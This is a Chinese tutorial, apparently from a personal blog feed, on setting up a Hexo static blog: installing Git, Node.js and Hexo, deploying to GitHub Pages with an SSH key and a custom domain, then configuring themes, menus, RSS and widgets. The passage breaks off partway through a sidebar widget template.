        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><h1 id="hexo史上最全搭建教程"><a href="#hexo史上最全搭建教程" class="headerlink" title="hexo史上最全搭建教程"></a>hexo史上最全搭建教程</h1><p>现在市面上的博客很多，如CSDN，博客园，简书等平台，可以直接在上面发表，用户交互做的好，写的文章百度也能搜索的到。缺点是比较不自由，会受到平台的各种限制和恶心的广告。</p><p>而自己购买域名和服务器，搭建博客的成本实在是太高了，不光是说这些购买成本，单单是花力气去自己搭这么一个网站，还要定期的维护它，对于我们大多数人来说，实在是没有这样的精力和时间。</p><p>那么就有第三种选择，直接在github page平台上托管我们的博客。这样就可以安心的来写作，又不需要定期维护，而且hexo作为一个快速简洁的博客框架，用它来搭建博客真的非常容易。</p><h2><a name="t0"></a><a id="Hexo_10"></a>Hexo简介</h2><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/" rel="nofollow" data-token="566552a7a62a77832cb692c22280f61a">hexo官网</a>进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><p>教程分三个部分，</p><ul><li>第一部分：hexo的初级搭建还有部署到github page上，以及个人域名的绑定。</li><li>第二部分：hexo的基本配置，更换主题，实现多终端工作，以及在coding page部署实现国内外分流</li><li>第三部分：hexo添加各种功能，包括搜索的SEO，阅读量统计，访问量统计和评论系统等。</li></ul><hr><h1><a name="t1"></a><a id="_22"></a>第一部分</h1><p>hexo的初级搭建还有部署到github page上，以及个人域名的绑定。</p><h1><a name="t2"></a><a id="Hexo_27"></a>Hexo简介</h1><p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/zh-cn/" rel="nofollow" data-token="566552a7a62a77832cb692c22280f61a">hexo官网</a>进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><h1><a name="t3"></a><a id="Hexo_31"></a>Hexo搭建步骤</h1><ol><li>安装Git</li><li>安装Node.js</li><li>安装Hexo</li><li>GitHub创建个人仓库</li><li>生成SSH添加到GitHub</li><li>将hexo部署到GitHub</li><li>设置个人域名</li><li>发布文章</li></ol><h1><a name="t4"></a><a id="1_Git_42"></a>1. 安装Git</h1><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。Git非常强大，我觉得建议每个人都去了解一下。廖雪峰老师的Git教程写的非常好，大家可以了解一下。<a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000" rel="nofollow" data-token="a7898ebe2baf3cae1521c34f89cd7516">Git教程</a></p><p>windows：到git官网上下载,<a href="https://gitforwindows.org/" rel="nofollow" data-token="65cbc636381262947ae8b932fb62d669">Download git</a>,下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p><p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">sudo apt-get install git<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>安装好后，用<code>git --version</code> 来查看一下版本</p><h1><a name="t5"></a><a id="2_nodejs_58"></a>2. 安装nodejs</h1><p>Hexo是基于nodeJS编写的，所以需要安装一下nodeJs和里面的npm工具。</p><p>windows：<a href="https://nodejs.org/en/download/" rel="nofollow" data-token="1ccdafce46a87ccfc591f0710f1c4f80">nodejs</a>选择LTS版本就行了。</p><p>linux：</p><pre class="prettyprint"><code class="prism language-shell has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nodejs<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">npm</span><div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>安装完后，打开命令行</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">node -vnpm -v<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>检查一下有没有安装成功</p><p>顺便说一下，windows在git安装完后，就可以直接使用git bash来敲命令行了，不用自带的cmd，cmd有点难用。</p><h1><a name="t6"></a><a id="3_hexo_80"></a>3. 安装hexo</h1><p>前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。</p><p>输入命令</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">npm install -g hexo-cli<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>依旧用<code>hexo -v</code>查看一下版本</p><p>至此就全部安装完了。</p><p>接下来初始化一下hexo</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo init myblog<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这个myblog可以自己取什么名字都行，然后</p><pre class="prettyprint"><code class="prism language-bash has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token function">cd</span> myblog //进入这个myblog文件夹<span class="token function">npm</span> <span class="token function">install</span><div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>新建完成后，指定文件夹目录下有：</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题</li><li>** _config.yml: 博客的配置文件**</li></ul><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo ghexo server<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>打开hexo的服务，在浏览器输入localhost:4000就可以看到你生成的博客了。</p><p>大概长这样：<br><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksvj6e0j211c0f2n60.jpg" class="lazyload"><br>使用ctrl+c可以把服务关掉。</p><h1><a name="t7"></a><a id="4_GitHub_125"></a>4. GitHub创建个人仓库</h1><p>首先，你先要有一个GitHub账户，去注册一个吧。</p><p>注册完登录后，在GitHub.com中看到一个New repository，新建仓库<br><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstcm7ej20ei0c1aah.jpg" class="lazyload"></p><p>创建一个和你用户名相同的仓库，<a href="http://xn--yfr16an19l.github.io" rel="nofollow" data-token="8a9cfed7ff8665d6939250ba12ba911f">后面加.github.io</a>，只有这样，将来要部署到GitHub page的时候，才会被识别，<a href="http://xn--xxxx-4m5f354ev5p.github.io" rel="nofollow" data-token="29340eb4ad390b2f61cc7ca101505eec">也就是xxxx.github.io</a>，其中xxx就是你注册GitHub的用户名。我这里是已经建过了。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstusrdj20iw0o4myp.jpg" class="lazyload"></p><p>点击create repository。</p><h1><a name="t8"></a><a id="5_SSHGitHub_141"></a>5. 生成SSH添加到GitHub</h1><p>回到你的git bash中，</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">git config --global user.name "yourname"git config --global user.email "youremail"<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。</p><p>可以用以下两条，检查一下你有没有输对</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">git config user.namegit config user.email<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后创建SSH,一路回车</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ssh-keygen -t rsa -C "youremail"<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这个时候它会告诉你已经生成了.ssh的文件夹。在你的电脑中找到这个文件夹。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstd106j20kb073gll.jpg" class="lazyload"></p><p>ssh，简单来讲，就是一个秘钥，其中，<code>id_rsa</code>是你这台电脑的私人秘钥，不能给别人看的，<code>id_rsa.pub</code>是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。</p><p>而后在GitHub的setting中，找到SSH keys的设置选项，点击<code>New SSH key</code><br>把你的<code>id_rsa.pub</code>里面的信息复制进去。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstdifaj210s0gfjrz.jpg" class="lazyload"></p><p>在gitbash中，查看是否成功</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">ssh -T git@github.com<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><h1><a name="t9"></a><a id="6_hexoGitHub_179"></a>6. 将hexo部署到GitHub</h1><p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 <code>_config.yml</code>，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">deploy:  type: git  repo: https://github.com/YourgithubName/YourgithubName.github.io.git  branch: master<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">npm install hexo-deployer-git --save<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo cleanhexo generatehexo deploy<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>其中 <code>hexo clean</code>清除了你之前生成的东西，也可以不加。<br><code>hexo generate</code> 顾名思义，生成静态文章，可以用 <code>hexo g</code>缩写<br><code>hexo deploy</code> 部署文章，可以用<code>hexo d</code>缩写</p><p>注意deploy时可能要你输入username和password。</p><p>得到下图就说明部署成功了，过一会儿就可以在<code>http://yourname.github.io</code> 这个网站看到你的博客了！！<br><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstbtvfj20lq01u3yd.jpg" class="lazyload"></p><h1><a name="t10"></a><a id="7__211"></a>7. 设置个人域名</h1><p>现在你的个人网站的地址是 <code>yourname.github.io</code>，如果觉得这个网址逼格不太够，这就需要你设置个人域名了。但是需要花钱。</p><p>注册一个阿里云账户,在<a href="https://wanwang.aliyun.com/?spm=5176.8142029.digitalization.2.e9396d3e46JCc5" rel="nofollow" data-token="d4fd2006cee1c75d664e7dba87778385">阿里云</a>上买一个域名，我买的是 <code>fangzh.top</code>，各个后缀的价格不太一样，比如最广泛的.com就比较贵，看个人喜好咯。</p><p>你需要先去进行实名认证,然后在域名控制台中，看到你购买的域名。</p><p>点<strong>解析</strong>进去，添加解析。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstcu8xj20d607wdfw.jpg" class="lazyload"></p><p>其中，192.30.252.153 和 192.30.252.154 是GitHub的服务器地址。<br><strong>注意，解析线路选择默认</strong>，不要像我一样选境外。这个境外是后面来做国内外分流用的,在后面的博客中会讲到。记得现在选择<strong>默认</strong>！！</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstf8unj20ob05b0sq.jpg" class="lazyload"></p><p>登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名<code>fangzh.top</code></p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstghklj20as04mt8n.jpg" class="lazyload"></p><p>然后在你的博客文件source中创建一个名为CNAME文件，不要后缀。写上你的域名。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstgsyrj208806aq2z.jpg" class="lazyload"></p><p>最后，在gitbash中，输入</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo cleanhexo ghexo d<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>过不了多久，再打开你的浏览器，输入你自己的域名，就可以看到搭建的网站啦！</p><p>接下来你就可以正式开始写文章了。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new newpapername<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后在source/_post中打开markdown文件，就可以开始编辑了。当你写完的时候，再</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo cleanhexo ghexo d<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>就可以看到更新了。</p><h1><a name="t11"></a><a id="_264"></a>第二部分</h1><p>hexo的基本配置，更换主题，实现多终端工作，以及在coding page部署实现国内外分流。</p><h1><a name="t12"></a><a id="1_hexo_269"></a>1. hexo基本配置</h1><p>在文件根目录下的<code>_config.yml</code>，就是整个hexo框架的配置文件了。可以在里面修改大部分的配置。详细可参考<a href="https://hexo.io/zh-cn/docs/configuration" rel="nofollow" data-token="0cd9e96179b40d463ae472906f4a098b">官方的配置</a>描述。</p><h3><a name="t13"></a><a id="_275"></a>网站</h3><div class="table-box"><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>title</code></td><td>网站标题</td></tr><tr><td><code>subtitle</code></td><td>网站副标题</td></tr><tr><td><code>description</code></td><td>网站描述</td></tr><tr><td><code>author</code></td><td>您的名字</td></tr><tr><td><code>language</code></td><td>网站使用的语言</td></tr><tr><td><code>timezone</code></td><td>网站时区。Hexo 默认使用您电脑的时区。<a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones" rel="nofollow" data-token="32f792257181ee0c25e2a967c7297faa">时区列表</a>。比如说：<code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。</td></tr></tbody></table></div><p>其中，<code>description</code>主要用于SEO，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h3><a name="t14"></a><a id="_290"></a>网址</h3><div class="table-box"><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>url</code></td><td>网址</td></tr><tr><td><code>root</code></td><td>网站根目录</td></tr><tr><td><code>permalink</code></td><td>文章的 <a href="https://hexo.io/zh-cn/docs/permalinks" rel="nofollow" data-token="79d8679b1fa8f4ab3a2e083ab4241c95">永久链接</a> 格式</td></tr><tr><td><code>permalink_defaults</code></td><td>永久链接中各部分的默认值</td></tr></tbody></table></div><p>在这里，你需要把<code>url</code>改成你的网站域名。</p><p>permalink，也就是你生成某个文章时的那个链接格式。</p><p>比如我新建一个文章叫<code>temp.md</code>，那么这个时候他自动生成的地址就是<code>http://yoursite.com/2018/09/05/temp</code>。</p><p>以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找 <a href="https://hexo.io/zh-cn/docs/permalinks" rel="nofollow" data-token="79d8679b1fa8f4ab3a2e083ab4241c95">永久链接</a> 。</p><div class="table-box"><table><thead><tr><th>参数</th><th>结果</th></tr></thead><tbody><tr><td><code>:year/:month/:day/:title/</code></td><td>2013/07/14/hello-world</td></tr><tr><td><code>:year-:month-:day-:title.html</code></td><td>2013-07-14-hello-world.html</td></tr><tr><td><code>:category/:title</code></td><td>foo/bar/hello-world</td></tr></tbody></table></div><p>再往下翻，中间这些都默认就好了。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">theme: landscape<h1 id="Deployment"><a href="#Deployment" class="headerlink" title="Deployment"></a>Deployment</h1><h2 id="Docs-https-hexo-io-docs-deployment-html"><a href="#Docs-https-hexo-io-docs-deployment-html" class="headerlink" title="Docs: https://hexo.io/docs/deployment.html"></a>Docs: <a href="https://hexo.io/docs/deployment.html">https://hexo.io/docs/deployment.html</a></h2><p>deploy:<br>  type: git<br>  repo: &lt;repository url&gt;<br>  branch: [branch]</p><div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p><code>theme</code>就是选择什么主题，也就是在<code>theme</code>这个文件夹下，在官网上有很多个主题，默认给你安装的是<code>lanscape</code>这个主题。当你需要更换主题时，在官网上下载，把主题的文件放在<code>theme</code>文件夹下，再修改这个参数就可以了。</p><p>接下来这个<code>deploy</code>就是网站的部署的，<code>repo</code>就是仓库(<code>Repository</code>)的简写。<code>branch</code>选择仓库的哪个分支。这个在之前进行github page部署的时候已经修改过了，不再赘述。而这个在后面进行双平台部署的时候会再次用到。</p><h3><a name="t15"></a><a id="Frontmatter_341"></a>Front-matter</h3><p>Front-matter 是文件最上方以 <code>---</code> 分隔的区域，用于指定个别文件的变量，举例来说：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">title: Hello Worlddate: 2013/7/13 20:46:25---<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>下是预先定义的参数，您可在模板中使用这些参数值并加以利用。</p><div class="table-box"><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td><code>layout</code></td><td>布局</td></tr><tr><td><code>title</code></td><td>标题</td></tr><tr><td><code>date</code></td><td>建立日期</td></tr><tr><td><code>updated</code></td><td>更新日期</td></tr><tr><td><code>comments</code></td><td>开启文章的评论功能</td></tr><tr><td><code>tags</code></td><td>标签（不适用于分页）</td></tr><tr><td><code>categories</code></td><td>分类（不适用于分页）</td></tr><tr><td><code>permalink</code></td><td>覆盖文章网址</td></tr></tbody></table></div><p>其中，分类和标签需要区别一下，分类具有顺序性和层次性，也就是说 <code>Foo, Bar</code> 不等于 <code>Bar, Foo</code>；而标签没有顺序和层次。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">categories:- Diarytags:- PS3- Games<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><h3><a name="t16"></a><a id="layout_376"></a>layout（布局）</h3><p>当你每一次使用代码</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new paper<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>它其实默认使用的是<code>post</code>这个布局，也就是在<code>source</code>文件夹下的<code>_post</code>里面。</p><p>Hexo 有三种默认布局：<code>post</code>、<code>page</code> 和 <code>draft</code>，它们分别对应不同的路径，而您自定义的其他布局和 <code>post</code> 相同，都将储存到 <code>source/_posts</code> 文件夹。</p><div class="table-box"><table><thead><tr><th>布局</th><th>路径</th></tr></thead><tbody><tr><td><code>post</code></td><td><code>source/_posts</code></td></tr><tr><td><code>page</code></td><td><code>source</code></td></tr><tr><td><code>draft</code></td><td><code>source/_drafts</code></td></tr></tbody></table></div><p>而new这个命令其实是：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new [layout] &lt;title&gt;<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>只不过这个layout默认是post罢了。</p><h4><a id="page_404"></a>page</h4><p>如果你想另起一页，那么可以使用</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new page board<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>系统会自动给你在source文件夹下创建一个board文件夹，<a href="http://xn--boardindex-zt2p02eqgs45dlht758bqmyd.md" rel="nofollow" data-token="4e64a53b8703e91bc2cf6f86b2772517">以及board文件夹中的index.md</a>，这样你访问的board对应的链接就是<code>http://xxx.xxx/board</code></p><h4><a id="draft_414"></a>draft</h4><p>draft是草稿的意思，也就是你如果想写文章，又不希望被看到，那么可以</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new draft newpage<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这样会在source/_draft中新建一个newpage.md文件，如果你的草稿文件写的过程中，想要预览一下，那么可以使用</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo server --draft<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>在本地端口中开启服务预览。</p><p>如果你的草稿文件写完了，想要发表到post中，</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo publish draft newpage<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>就会自动把newpage.md发送到post中。</p><hr><h1><a name="t17"></a><a id="2__444"></a>2. 更换主题</h1><p>到这一步，如果你觉得默认的<code>landscape</code>主题不好看，那么可以在官网的主题中，选择你喜欢的一个主题进行修改就可以啦。<a href="https://hexo.io/themes/" rel="nofollow" data-token="93c3a226a9dd6802027cf6c5a36b3180">点这里</a></p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkswpjhtj21fu0rhtp6.jpg" class="lazyload"></p><p>这里有200多个主题可以选。不过最受欢迎的就是那么几个，比如<a href="https://github.com/theme-next/hexo-theme-next" rel="nofollow" data-token="b9e2454e695795db7584af6acfe17ba7">NexT主题</a>，非常的简洁好看，大多数人都选择这个，关于这个的教程也比较多。不过我选择的是<a href="https://github.com/ppoffice/hexo-theme-hueman" rel="nofollow" data-token="7fd6d2eec71ae5b1ebd93695d162b8e5">hueman</a>这个主题，好像是从WordPress移植过来的，展示效果如下：</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrksxvknrj21fc0q8tsl.jpg" class="lazyload"></p><p>不管怎么样，至少是符合我个人的审美。</p><p>直接在github链接上下载下来，然后放到<code>theme</code>文件夹下就行了，然后再在刚才说的配置文件中把<code>theme</code>换成那个主题文件夹的名字，它就会自动在<code>theme</code>文件夹中搜索你配置的主题。</p><p>而后进入<code>hueman</code>这个文件夹，可以看到里面也有一个配置文件<code>_config.xml</code>，貌似它默认是<code>_config.xml.example</code>，把它复制一份，重命名为<code>_config.xml</code>就可以了。这个配置文件是修改你整个主题的配置文件。</p><h3><a name="t18"></a><a id="menu_466"></a>menu（菜单栏）</h3><p>也就是上面菜单栏上的这些东西。</p><p><img alt data-src="http://ww1.sinaimg.cn/large/d40b6c29gy1fvrkstfwjbj20jd0233ye.jpg" class="lazyload"></p><p>其中，About这个你是找不到网页的，因为你的文章中没有about这个东西。如果你想要的话，可以执行命令</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new page about<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>它就会在根目录下<code>source</code>文件夹中新建了一个<code>about</code>文件夹，<a href="http://xn--index-ok2hl60a.md" rel="nofollow" data-token="8e35dc4dcc1b601bc7b92075c8c9ab97">以及index.md</a>，在index.md中写上你想要写的东西，就可以在网站上展示出来了。</p><p>如果你想要自己再自定义一个菜单栏的选项，那么就</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">hexo new page yourdiy<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>然后在主题配置文件的menu菜单栏添加一个 <code>Yourdiy : /yourdiy</code>，注意冒号后面要有空格，以及前面的空格要和menu中默认的保持整齐。然后在<code>languages</code>文件夹中，找到<code>zh-CN.yml</code>，在index中添加<code>yourdiy: '中文意思'</code>就可以显示中文了。</p><h3><a name="t19"></a><a id="customize_490"></a>customize(定制)</h3><p>在这里可以修改你的个人logo，默认是那个hueman，在<code>source/css/images</code>文件夹中放入自己要的logo，再改一下<code>url</code>的链接名字就可以了。</p><p><code>favicon</code>是网站中出现的那个小图标的icon，找一张你喜欢的logo，然后转换成ico格式，放在images文件夹下，配置一下路径就行。</p><p><code>social_links</code> ，可以显示你的社交链接，而且是有logo的。</p><p><strong>tips:</strong></p><p>在这里可以添加一个rss功能，也就是那个符号像wifi一样的东西。</p><h3><a name="t20"></a><a id="RSS_502"></a>添加RSS</h3><p><strong>1. 什么是RSS？</strong></p><p>RSS也就是订阅功能，你可以理解为类似与订阅公众号的功能，来订阅各种博客，杂志等等。</p><p><strong>2. 为什么要用RSS？</strong></p><p>就如同订阅公众号一样，你对某个公众号感兴趣，你总不可能一直时不时搜索这个公众号来看它的文章吧。博客也是一样，如果你喜欢某个博主，或者某个平台的内容，你可以通过RSS订阅它们，然后在RSS阅读器上可以实时推送这些消息。现在网上的垃圾消息太多了，如果你每一天都在看这些消息中度过，漫无目的的浏览，只会让你的时间一点一点的流逝，太不值得了。如果你关注的博主每次都发的消息都是精华，而且不是每一天十几条几十条的轰炸你，那么这个博主就值得你的关注，你就可以通过RSS订阅他。</p><p>在我的理解中，如果你不想每天都被那些没有质量的消息轰炸，只想安安静静的关注几个博主，每天看一些有质量的内容也不用太多，那么RSS订阅值得你的拥有。</p><p><strong>3. 添加RSS功能</strong></p><p>先安装RSS插件</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">npm i hexo-generator-feed<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>而后在你整个项目的<code>_config.yml</code>中找到Extensions，添加：</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"># Extensions## Plugins: https://hexo.io/plugins/#RSS订阅plugin:- hexo-generator-feed#Feed Atomfeed:  type: atom  path: atom.xml  limit: 20<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p>这个时候你的RSS链接就是  域名<code>/atom.xml</code>了。</p><p>所以，在主题配置文件中的这个<code>social links</code>，开启RSS的页面功能，这样你网站上就有那个像wifi一样符号的RSS logo了，注意空格。</p><pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">rss: /atom.xml<div class="hljs-button &#123;2&#125;" data-title="复制"></div></code><ul class="pre-numbering" style></ul></pre><p><strong>4. 如何关注RSS？</strong></p><p>首先，你需要一个RSS阅读器，在这里我推荐<code>inoreader</code>，宇宙第一RSS阅读器，而且中文支持的挺好。不过它没有PC端的程序，只有网页版，chrome上有插件。在官网上用google账号或者自己注册账号登录，就可以开始你的关注之旅了。</p><p>每次需要关注某个博主时，就点开他的RSS链接，把链接复制到<code>inoreader</code>上，就能关注了，当然，如果是比较大众化的很厉害的博主，你直接搜名字也可以的，比如每个人都非常佩服的阮一峰大师，直接在阅读器上搜索<code>阮一峰</code>，应该就能出来了。</p><p>我关注的比如，阮一峰的网络日志，月光博客，知乎精选等，都很不错。当然，还有我！！赶快关注我吧！你值得拥有：<a href="http://fangzh.top/atom.xml" rel="nofollow" data-token="1d365b8b8a72c69f7ac85d99cbcf993d">http://fangzh.top/atom.xml</a></p><p>在安卓端，inoreader也有下载，不过因为国内google是登录不了的，你需要在inoreader官网上把你的密码修改了，然后就可以用账户名和密码登录了。</p><p>在IOS端，没用过，好像是reader 3可以支持inoreader账户，还有个readon也不错，可以去试试。</p><h3><a name="t21"></a><a id="widgets_559"></a>widgets(侧边栏)</h3><p>侧边栏的小标签，如果你想自己增加一个，比如我增加了一个联系方式，那么我把<code>communication</code>写在上面，在<code>zh-CN.yml</code>中的<code>sidebar</code>，添加<code>communication: '中文'</code>。</p><p>然后在<code>hueman/layout/widget</code>中添加一个<code>communicaiton.ejs</code>，填入模板：</p><pre class="prettyprint"><code class="prism language-js has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>site<span class="token punctuation">.</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token operator">%</span><span class="token operator">&gt;</span>    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"widget-wrap widget-list"</span><span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>h3 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"widget-title"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token function">__</span><span class="token punctuation">(</span><span class="token string">'sidebar.communiation'</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"widget"</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span><span 